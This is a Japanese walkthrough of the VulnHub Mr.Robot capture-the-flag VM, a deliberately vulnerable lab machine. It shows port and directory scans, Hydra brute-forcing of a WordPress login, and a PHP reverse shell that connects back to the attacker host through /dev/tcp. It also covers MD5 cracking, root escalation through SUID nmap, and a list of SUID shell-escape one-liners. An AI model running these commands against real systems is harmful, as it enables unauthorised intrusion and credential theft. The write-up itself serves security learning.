# Mr.Robot CTF

https://www.vulnhub.com/entry/mr-robot-1,151/

.ova ダウンロード時、MS Defender でウイルス検出された。  
リアルタイム検出を切ってから再ダウンロード。自己責任で。

## ステージ１（情報収集）

### IP

```shell
sudo netdiscover -r 192.168.11.0/24
```

http://192.168.11.16

### ポートスキャン

```shell
$ sudo nmap -sS -sV -A -p- 192.168.11.16
Nmap scan report for 192.168.11.16
Host is up (0.0012s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:73:7E:7F (Oracle VirtualBox virtual NIC)
Aggressive OS guesses: Linux 3.10 - 4.11 (98%), Linux 3.2 - 4.9 (94%), Linux 3.2 - 3.8 (93%), Linux 3.13 or 4.2 (92%), Linux 4.2 (92%), Linux 4.4 (92%), Linux 3.18 (92%), Linux 3.13 (91%), Linux 3.16 - 4.6 (91%), Linux 2.6.32 - 3.13 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   1.25 ms 192.168.11.16
```

SSH が閉じているので、入り口は HTTP しかなさそう。（OS 自体に穴がなければ）

### ディレクトリ構成

```shell
$ dirb http://192.168.11.16 /usr/share/wordlists/dirb/common.txt

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Sun Dec  1 21:03:53 2024
URL_BASE: http://192.168.11.16/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.11.16/ ----
==> DIRECTORY: http://192.168.11.16/0/
==> DIRECTORY: http://192.168.11.16/admin/
+ http://192.168.11.16/atom (CODE:301|SIZE:0)
==> DIRECTORY: http://192.168.11.16/audio/
==> DIRECTORY: http://192.168.11.16/blog/
==> DIRECTORY: http://192.168.11.16/css/
+ http://192.168.11.16/dashboard (CODE:302|SIZE:0)
+ http://192.168.11.16/favicon.ico (CODE:200|SIZE:0)
==> DIRECTORY: http://192.168.11.16/feed/
==> DIRECTORY: http://192.168.11.16/image/
==> DIRECTORY: http://192.168.11.16/Image/
==> DIRECTORY: http://192.168.11.16/images/
+ http://192.168.11.16/index.html (CODE:200|SIZE:1077)
+ http://192.168.11.16/index.php (CODE:301|SIZE:0)
+ http://192.168.11.16/intro (CODE:200|SIZE:516314)
==> DIRECTORY: http://192.168.11.16/js/
+ http://192.168.11.16/license (CODE:200|SIZE:19930)
+ http://192.168.11.16/login (CODE:302|SIZE:0)
+ http://192.168.11.16/page1 (CODE:301|SIZE:0)
+ http://192.168.11.16/phpmyadmin (CODE:403|SIZE:94)
+ http://192.168.11.16/rdf (CODE:301|SIZE:0)
+ http://192.168.11.16/readme (CODE:200|SIZE:7334)
+ http://192.168.11.16/robots (CODE:200|SIZE:41)
+ http://192.168.11.16/robots.txt (CODE:200|SIZE:41)
+ http://192.168.11.16/rss (CODE:301|SIZE:0)
+ http://192.168.11.16/rss2 (CODE:301|SIZE:0)
+ http://192.168.11.16/sitemap (CODE:200|SIZE:0)
+ http://192.168.11.16/sitemap.xml (CODE:200|SIZE:0)
==> DIRECTORY: http://192.168.11.16/video/
==> DIRECTORY: http://192.168.11.16/wp-admin/
+ http://192.168.11.16/wp-config (CODE:200|SIZE:0)
==> DIRECTORY: http://192.168.11.16/wp-content/
+ http://192.168.11.16/wp-cron (CODE:200|SIZE:0)
==> DIRECTORY: http://192.168.11.16/wp-includes/
+ http://192.168.11.16/wp-links-opml (CODE:200|SIZE:228)
+ http://192.168.11.16/wp-load (CODE:200|SIZE:0)
+ http://192.168.11.16/wp-login (CODE:200|SIZE:2747)
+ http://192.168.11.16/wp-mail (CODE:403|SIZE:3018)
+ http://192.168.11.16/wp-settings (CODE:500|SIZE:0)
+ http://192.168.11.16/wp-signup (CODE:302|SIZE:0)
+ http://192.168.11.16/xmlrpc (CODE:405|SIZE:42)
+ http://192.168.11.16/xmlrpc.php (CODE:405|SIZE:42)
```

### ブラウザで表示

- http://192.168.11.16/0/  
  WordPress っぽいブログページが表示された。検索ボックス、ログイン画面あり。

- http://192.168.11.16/admin/  
  転送を繰り返す動き。たぶん必要なパラメータが無いのでリファラに戻されている。

- http://192.168.11.16/blog/  
  forbidden

- http://192.168.11.16/feed/  
  xml ファイルがダウンロードされる

```xml
<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>user&#039;s Blog!</title>
	<atom:link href="http://192.168.11.16/feed/" rel="self" type="application/rss+xml" />
	<link>http://192.168.11.16</link>
	<description>Just another WordPress site</description>
	<lastBuildDate></lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>hourly</sy:updatePeriod>
	<sy:updateFrequency>1</sy:updateFrequency>
	<generator>https://wordpress.org/?v=4.3.34</generator>
</channel>
</rss>
```

- http://192.168.11.16/image/  
  ブログの画像表示画面。コメント投稿フォームがある。

- http://192.168.11.16/images/  
  forbidden

- http://192.168.11.16/login  
  http://192.168.11.16/wp-login.php に転送

- http://192.168.11.16/phpmyadmin  
  localhost からのみ接続可能と表示される

- http://192.168.11.16/readme  
  WordPress の Readme

- http://192.168.11.16/sitemap  
  XML Parsing Error: no root element found
  Location: http://192.168.11.16/sitemap
  Line Number 1, Column 1:

- http://192.168.11.16/wp-admin/  
  WordPress のログイン画面

- http://192.168.11.16/robots.txt

```text
User-agent: *
fsocity.dic
key-1-of-3.txt
```

キー（1/3）を発見！

- http://192.168.11.16/key-1-of-3.txt

```text
073403c8a58a1f80d943455fb30724b9
```

MD5 ハッシュ

- http://192.168.11.16/fsocity.dic

```text
true
false
wikia
from
the
now
Wikia
extensions
（続く）
```

何かよく分からない単語リスト

## ステージ２（WordPress ログイン、リバースシェル起動、ユーザー変更）

### nikto 脆弱性探査

```shell
$ nikto -h http://192.168.11.16
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.11.16
+ Target Hostname:    192.168.11.16
+ Target Port:        80
+ Start Time:         2024-12-01 21:57:18 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /BUIpnWAw.PRINT: Retrieved x-powered-by header: PHP/5.5.29.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /index: Uncommon header 'tcn' found, with contents: list.
+ /index: Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. The following alternatives for 'index' were found: index.html, index.php. See: http://www.wisec.it/sectou.php?id=4698ebdc59d15,https://exchange.xforce.ibmcloud.com/vulnerabilities/8275
+ /admin/: This might be interesting.
+ /image/: Drupal Link header found with value: <http://192.168.11.16/?p=23>; rel=shortlink. See: https://www.drupal.org/
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ /license.txt: License file found may identify site software.
+ /admin/index.html: Admin login page/section found.
+ /wp-login/: Cookie wordpress_test_cookie created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /wp-login/: Admin login page/section found.
+ /wordpress/: A Wordpress installation was found.
+ /wp-admin/wp-login.php: Wordpress login found.
+ /wordpress/wp-admin/wp-login.php: Wordpress login found.
+ /blog/wp-login.php: Wordpress login found.
+ /wp-login.php: Wordpress login found.
+ /wordpress/wp-login.php: Wordpress login found.
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 8102 requests: 0 error(s) and 18 item(s) reported on remote host
+ End Time:           2024-12-01 21:59:58 (GMT-5) (160 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

### WordPress ログインブルートフォース

#### admin

ググったら WordPress のデフォルト管理者ユーザー名は admin とのことなので、ユーザー名固定でブルートフォース

```shell
$ hydra 192.168.11.16 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.11.16%2Fwp-admin%2F&testcookie=1:H=Cookie\: s_fid=12D63D3389C939B6-27B51C3E15FF28A1; s_nr=1733107592965; wordpress_test_cookie=WP+Cookie+check; s_cc=true; s_sq=%5B%5BB%5D%5D:Error" -l admin -P /usr/share/wordlists/metasploit/password.lst -f
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
```

ヒットしなかった。というより、よく見たら「無効なユーザー名」と表示されていた。  
エラー内容が、無効なユーザー名であることを示唆しているので、パスワード固定でユーザー名のブルートフォースが可能。

#### ユーザー名ブルートフォース

リストとして、robots.txt で見つけたディクショナリを用いる。

```shell
$ hydra 192.168.11.16 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.11.16%2Fwp-admin%2F&testcookie=1:H=Cookie\: s_fid=12D63D3389C939B6-27B51C3E15FF28A1; s_nr=1733107592965; wordpress_test_cookie=WP+Cookie+check; s_cc=true; s_sq=%5B%5BB%5D%5D:Invalid username" -L ./fsocity.dic  -p password
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-02 01:14:12
[INFORMATION] escape sequence \: detected in module option, no parameter verification is performed.
[DATA] max 16 tasks per 1 server, overall 16 tasks, 858235 login tries (l:858235/p:1), ~53640 tries per task
[DATA] attacking http-post-form://192.168.11.16:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.11.16%2Fwp-admin%2F&testcookie=1:H=Cookie\: s_fid=12D63D3389C939B6-27B51C3E15FF28A1; s_nr=1733107592965; wordpress_test_cookie=WP+Cookie+check; s_cc=true; s_sq=%5B%5BB%5D%5D:Invalid username
[80][http-post-form] host: 192.168.11.16   login: Elliot   password: password
[80][http-post-form] host: 192.168.11.16   login: elliot   password: password
[STATUS] 2920.00 tries/min, 2920 tries in 00:01h, 855315 to do in 04:53h, 16 active
[STATUS] 2941.67 tries/min, 8825 tries in 00:03h, 849410 to do in 04:49h, 16 active
[80][http-post-form] host: 192.168.11.16   login: ELLIOT   password: password
[STATUS] 2932.00 tries/min, 20524 tries in 00:07h, 837711 to do in 04:46h, 16 active
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
```

ユーザー名「elliot」が存在することが分かった。  
エラー表示が「The password you entered・・・」に変わったので、続いてパスワードブルートフォース。

#### パスワードブルートフォース

```shell
$ sort fsocity.dic | uniq > fsocity-uniq.dic
$ hydra 192.168.11.16 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.11.16%2Fwp-admin%2F&testcookie=1:H=Cookie\: s_fid=12D63D3389C939B6-27B51C3E15FF28A1; s_nr=1733107592965; wordpress_test_cookie=WP+Cookie+check; s_cc=true; s_sq=%5B%5BB%5D%5D:The password " -l elliot -P ./fsocity-uniq.dic
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-02 02:05:01
[INFORMATION] escape sequence \: detected in module option, no parameter verification is performed.
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 11452 login tries (l:1/p:11452), ~716 tries per task
[DATA] attacking http-post-form://192.168.11.16:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.11.16%2Fwp-admin%2F&testcookie=1:H=Cookie\: s_fid=12D63D3389C939B6-27B51C3E15FF28A1; s_nr=1733107592965; wordpress_test_cookie=WP+Cookie+check; s_cc=true; s_sq=%5B%5BB%5D%5D:The password
[STATUS] 2856.00 tries/min, 2856 tries in 00:01h, 8596 to do in 00:04h, 16 active
[80][http-post-form] host: 192.168.11.16   login: elliot   password: ER28-0652
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-12-02 02:07:09
```

elliot のパスワードは「ER28-0652」と判明。  
→ WordPress の管理画面にログイン可能になった。

```test
WordPress 4.3.34 running
```

ちなみに、WordPress 専用のコマンドもある。

```shell
wpscan --url 192.168.11.16 --passwords fsocity-uniq.dic --usernames elliot
```

### リバースシェル

HackTricks で、404.php テンプレートを更新してコードを仕込めることを知った。（管理権限必要）
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress  
リバースシェルのコードを埋め込んだ。下記のコードの IP を変えただけ。  
（後述のとおり、もっとシンプルな 1 行のコードで十分）  
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

ブラウザで存在しないページにアクセスして、404.php をトリガー。  
http://192.168.11.16/2024/12/06/test/

```shell
$ nc -lvp 1234
listening on [any] 1234 ...
192.168.11.16: inverse host lookup failed: Unknown host
connect to [192.168.11.9] from (UNKNOWN) [192.168.11.16] 55837
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 05:54:27 up  4:10,  0 users,  load average: 0.00, 0.01, 0.13
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ ls
bin
boot
dev
etc
home
initrd.img
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
vmlinuz
$ pwd
/
$ whoami
daemon
$
```

daemon ユーザーでシェルを起動することに成功。

### シェルで情報収集

```shell
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
ftp:x:103:106:ftp daemon,,,:/srv/ftp:/bin/false
bitnamiftp:x:1000:1000::/opt/bitnami/apps:/bin/bitnami_ftp_false
mysql:x:1001:1001::/home/mysql:
varnish:x:999:999::/home/varnish:
robot:x:1002:1002::/home/robot:
```

```shell
$ ls -al /etc/cron.d
total 12
drwxr-xr-x  2 root root 4096 Jun 24  2015 .
drwxr-xr-x 77 root root 4096 Dec  2  2024 ..
-rw-r--r--  1 root root  102 Feb  9  2013 .placeholder
```

```shell
$ ls /home
robot
$ ls -al /home/robot
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
```

キー（2/3）を発見したが、robot ユーザーでログインする必要がある。

```shell
$ cat /home/robot/password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```

```shell
$ su - robot
su: must be run from a terminal
```

```shell
$ find / -user robot 2>/dev/null
/home/robot/password.raw-md5
/home/robot/key-2-of-3.txt
```

リバースシェルをこれに変えた。

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.11.9/1234 0>&1'") ?>
```

su: must be run from a terminal エラーの回避策として、Python 使用。  
https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/

```shell
daemon@linux:/opt/bitnami/apps/wordpress/htdocs$ python -c 'import pty; pty.spawn("/bin/bash")'
<pps/wordpress/htdocs$ python -c 'import pty; pty.spawn("/bin/bash")'
daemon@linux:/opt/bitnami/apps/wordpress/htdocs$ su - robot
su - robot
Password: c3fcd3d76192e4007dfb496cca67e13b

su: Authentication failure
daemon@linux:/opt/bitnami/apps/wordpress/htdocs$ su - robot
su - robot
Password: robot:c3fcd3d76192e4007dfb496cca67e13b

su: Authentication failure
daemon@linux:/opt/bitnami/apps/wordpress/htdocs$
```

password.raw-md5 はハッシュであってパスワードではないらしい。分かりにくい。  
パスワードの MD5 ハッシュからユーザー変更することは可能か？

オンラインの MD5 解読で、4 つ目のサイトでヒットした。

```text
×　https://10015.io/tools/md5-encrypt-decrypt
×　https://md5decrypt.net/en/
×　https://www.md5online.org/md5-decrypt.html
〇　https://md5hashing.net/hash/md5/
```

abcdefghijklmnopqrstuvwxyz

```shell
daemon@linux:/opt/bitnami/apps/wordpress/htdocs$ su - robot
su - robot
Password: abcdefghijklmnopqrstuvwxyz

$ whoami
robot

$ cat key-2-of-3.txt
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
```

キー（2/3）クリア！

## ステージ３（特権昇格）

### /etc/issue

```shell
cat /etc/issue
   _____          __________      ___.           __
  /     \\_______  \\______   \\ ____\\_ |__   _____/  |_
 /  \\ /  \\_  __ \\  |       _//  _ \\| __ \\ /  _ \\   __\\
/    Y    \\  | \\/  |    |   (  <_> ) \\_\\ (  <_> )  |
\\____|__  /__|     |____|_  /\\____/|___  /\\____/|__|
        \\/                \\/           \\/
```

特になし

### cron チェック

```shell
$ ls -al /etc/cron*
-rw-r--r-- 1 root root  787 Dec  2  2024 /etc/crontab

/etc/cron.d:
total 12
drwxr-xr-x  2 root root 4096 Jun 24  2015 .
drwxr-xr-x 77 root root 4096 Dec  2  2024 ..
-rw-r--r--  1 root root  102 Feb  9  2013 .placeholder

/etc/cron.daily:
total 44
drwxr-xr-x  2 root root  4096 Jun 24  2015 .
drwxr-xr-x 77 root root  4096 Dec  2  2024 ..
-rwxr-xr-x  1 root root 15481 Apr 10  2014 apt
-rwxr-xr-x  1 root root   256 Mar  7  2014 dpkg
-rwxr-xr-x  1 root root   372 Jan 22  2014 logrotate
-rwxr-xr-x  1 root root   249 Feb 17  2014 passwd
-rw-r--r--  1 root root   102 Feb  9  2013 .placeholder
-rwxr-xr-x  1 root root   328 Jul 18  2014 upstart

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Jun 24  2015 .
drwxr-xr-x 77 root root 4096 Dec  2  2024 ..
-rw-r--r--  1 root root  102 Feb  9  2013 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Jun 24  2015 .
drwxr-xr-x 77 root root 4096 Dec  2  2024 ..
-rw-r--r--  1 root root  102 Feb  9  2013 .placeholder

/etc/cron.weekly:
total 16
drwxr-xr-x  2 root root 4096 Jun 24  2015 .
drwxr-xr-x 77 root root 4096 Dec  2  2024 ..
-rwxr-xr-x  1 root root  427 Apr 16  2014 fstrim
-rw-r--r--  1 root root  102 Feb  9  2013 .placeholder
```

cron に隙は無さそう

### sudo チェック

```shell
$ cat /etc/group
root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:syslog
tty:x:5:
disk:x:6:
lp:x:7:
mail:x:8:
news:x:9:
uucp:x:10:
man:x:12:
proxy:x:13:
kmem:x:15:
dialout:x:20:
fax:x:21:
voice:x:22:
cdrom:x:24:
floppy:x:25:
tape:x:26:
sudo:x:27:
audio:x:29:
dip:x:30:
www-data:x:33:
backup:x:34:
operator:x:37:
list:x:38:
irc:x:39:
src:x:40:
gnats:x:41:
shadow:x:42:
utmp:x:43:
video:x:44:
sasl:x:45:
plugdev:x:46:
staff:x:50:
games:x:60:
users:x:100:
nogroup:x:65534:
libuuid:x:101:
netdev:x:102:
crontab:x:103:
syslog:x:104:
ssh:x:105:
ftp:x:106:
bitnami:x:1000:
admin:x:107:
mysql:x:1001:
varnish:x:999:
robot:x:1002:
```

特になし

### suid

suid ビットがセットされているファイルを検索する

```shell
$ find / -perm -u=s -type f 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
```

nmap はデフォルトで suid がセットされるコマンドではない

### nmap

```shell
$ nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
# whoami
root
```

root 昇格！

```shell
# ls -al /root
total 32
drwx------  3 root root 4096 Nov 13  2015 .
drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
-rw-------  1 root root 4058 Nov 14  2015 .bash_history
-rw-r--r--  1 root root 3274 Sep 16  2015 .bashrc
drwx------  2 root root 4096 Nov 13  2015 .cache
-rw-r--r--  1 root root    0 Nov 13  2015 firstboot_done
-r--------  1 root root   33 Nov 13  2015 key-3-of-3.txt
-rw-r--r--  1 root root  140 Feb 20  2014 .profile
-rw-------  1 root root 1024 Sep 16  2015 .rnd
# cat /root/key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```

完了！

## 振り返り

- robots.txt に書かれているのは「見られたくないファイル」かもしれない
- CTF の文脈では、謎のワードリストが提供されたらブルートフォースに使えという意味かも（遅延戦術じゃなければ）
- MD5 ハッシュは、1 つのサイトでヒットしなくても、複数のサイトを回れば見つかる可能性がある
- 外部コマンドを実行可能なプログラム に suid が付いていたら容易に root を取られる

### SUID ビットの設定が特に危険なプログラム

- エディタ: vim, nano, vi

```shell
vim -c '!sh'
```

- シェル: bash, sh
- スクリプト実行環境: python, perl, ruby 他多数
- デバッガや実行環境: gdb, strace, gcc
- アーカイブ: tar, zip/unzip, 7z

```shell
tar -cf /dev/null /dev/null --to-command=/bin/sh
```

- ネットワーク: nmap, ftp, scp, apache2

```shell
# invalid command として1行目（root）が表示される
apache2 -f /etc/shadow
```

- DBMS: mysql, psql
- その他: tmux/screen, env

```shell
env /bin/sh
```
